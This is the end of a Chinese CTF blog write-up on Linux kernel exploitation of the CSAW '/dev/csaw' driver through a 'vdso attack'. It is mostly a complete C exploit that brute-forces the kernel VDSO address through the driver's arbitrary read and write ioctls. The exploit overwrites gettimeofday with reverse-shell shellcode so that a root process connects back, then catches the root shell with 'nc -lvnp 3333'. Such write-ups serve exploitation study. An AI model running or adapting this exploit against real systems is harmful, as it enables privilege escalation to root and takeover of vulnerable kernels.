<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> offset = get_gettimeofday_str_offset();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">uint64_t</span> addr = <span class="number">0xffff880000000000</span>; addr&lt;<span class="number">0xffffc80000000000</span>; addr+=<span class="number">0x1000</span>) &#123;</span><br><span class="line">    RAA(fd,channel_id,read_buff,addr,<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(read_buff+offset,<span class="string">&quot;gettimeofday&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;%p found it?\n&quot;</span>, addr);</span><br><span class="line">        vdso_addr = addr;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：能劫持 vdso 的核心就是 vdso 在内核状态下是可写的，高版本内核就不可写了</li>
</ul>
<p>如果爆破出了 VDSO 的内核地址，就使用 GDB 把 VDSO 给 dump 下来，然后拖入 IDA 寻找函数 <code>gettimeofday</code> 的偏移（在 <code>get_gettimeofday_str_offset</code> 中查找的是 <code>gettimeofday</code> 字符串偏移）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vdso_addr in kernel: <span class="number">0xffff880001e04000</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; dump memory ./vdso.so <span class="number">0xffff880001e04000</span> <span class="number">0xffff880001e05000</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/10/08/cred%20attack+vdso%20attack/1665238227526.png" alt="1665238227526"> </p>
<p>写入的 Shellcode 是一个反弹 shell，它将 root shell 反弹到本地端口3333，我们只需 nc 本地端口3333即可 </p>
<ul>
<li>如果有 root 权限的程序，调用我们的 shellcode，那么我们的 shellcode 也是以 root 权限执行</li>
<li>在 Linux 中，crontab 是带有 root 权限的，并且它会不断的调用 vdso 里的 gettimeofday 函数</li>
<li>在 qemu 里，使用了一个程序来模拟（本题目是 <code>/sbin/init</code>）</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE     0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> buf_size;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">grow_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">loff_t</span> index;</span><br><span class="line">    <span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_gettimeofday_str_offset</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> vdso_addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line">    <span class="keyword">char</span>* name = <span class="string">&quot;gettimeofday&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!vdso_addr)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error get name&#x27;s offset&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;vdso_addr in user: 0x%lx\n&quot;</span>,vdso_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> name_addr = memmem(vdso_addr, <span class="number">0x1000</span>, name, <span class="built_in">strlen</span>(name));</span><br><span class="line">    <span class="keyword">if</span> (name_addr &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error get name&#x27;s offset&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> name_addr - vdso_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span> *read_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_channel</span>;</span></span><br><span class="line">    </span><br><span class="line">    seek_channel.id = channel_id;</span><br><span class="line">    seek_channel.index = addr<span class="number">-0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    read_channel.id = channel_id;</span><br><span class="line">    read_channel.buf = (<span class="keyword">char</span>*)read_buff;</span><br><span class="line">    read_channel.count = len;</span><br><span class="line">    ioctl(fd, CSAW_READ_CHANNEL, &amp;read_channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span>* write_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_channel</span>;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">        seek_channel.id = channel_id;</span><br><span class="line">        seek_channel.index = addr<span class="number">-0x10</span>+i;</span><br><span class="line">        seek_channel.whence = SEEK_SET;</span><br><span class="line">        ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">        write_channel.id = channel_id;</span><br><span class="line">        write_channel.buf = (<span class="keyword">char</span>*)write_buff+i;</span><br><span class="line">        write_channel.count = <span class="number">1</span>;</span><br><span class="line">        ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_channel);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">channel_alloc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">channel_shrink</span>;</span></span><br><span class="line">    <span class="keyword">int</span> channel_id;</span><br><span class="line">    <span class="keyword">char</span> * read_buff = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">size_t</span> vdso_addr = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> shellcode[]=<span class="string">&quot;\x90\x53\x48\x31\xc0\xb0\x66\x0f\x05\x48\x31\xdb\x48\x39\xc3\x75\x0f\x48\x31\xc0\xb0\x39\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x09\x5b\x48\x31\xc0\xb0\x60\x0f\x05\xc3\x48\x31\xd2\x6a\x01\x5e\x6a\x02\x5f\x6a\x29\x58\x0f\x05\x48\x97\x50\x48\xb9\xfd\xff\xf2\xfa\x80\xff\xff\xfe\x48\xf7\xd1\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x07\x48\x31\xc0\xb0\xe7\x0f\x05\x90\x6a\x03\x5e\x6a\x21\x58\x48\xff\xce\x0f\x05\x75\xf6\x48\xbb\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd3\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x0f\x05&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/csaw&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;open error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read_buff = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    channel_alloc.buf_size = <span class="number">0x100</span>;</span><br><span class="line">    channel_alloc.id = <span class="number">-1</span>;</span><br><span class="line">    ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;channel_alloc);</span><br><span class="line">    <span class="keyword">if</span>(channel_alloc.id == <span class="number">-1</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;alloc channel wrong&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;alloc channel id is :%d\n&quot;</span>,channel_alloc.id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    channel_id = channel_alloc.id;</span><br><span class="line">    channel_shrink.id = <span class="number">1</span>;</span><br><span class="line">    channel_shrink.size = <span class="number">0x101</span>;</span><br><span class="line">    ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;channel_shrink);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> offset = get_gettimeofday_str_offset();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lx\n&quot;</span>,offset);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint64_t</span> addr = <span class="number">0xffff880000000000</span>; addr&lt;<span class="number">0xffffc80000000000</span>; addr+=<span class="number">0x1000</span>) &#123;</span><br><span class="line">        RAA(fd,channel_id,read_buff,addr,<span class="number">0x1000</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(read_buff+offset,<span class="string">&quot;gettimeofday&quot;</span>)) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;%p found it?\n&quot;</span>, addr);</span><br><span class="line">            vdso_addr = addr;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(vdso_addr == <span class="number">-1</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;not find vdso&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;vdso_addr in kernel: 0x%lx\n&quot;</span>,vdso_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> gettimeofday = vdso_addr + <span class="number">0xcb0</span>;</span><br><span class="line">    WAA(fd,channel_id,shellcode,gettimeofday,<span class="built_in">strlen</span>(shellcode));</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;open a shell\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;nc -lvnp 3333&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>尝试了一下 “cred attack” 和 “vdso attack”</p>
<p>本来还想试试 “HijackPrctl”，但在 <code>qwb2018-solid_core</code> 中已经复现过了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">171</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">10</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">111</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">2.3m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">34:21</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
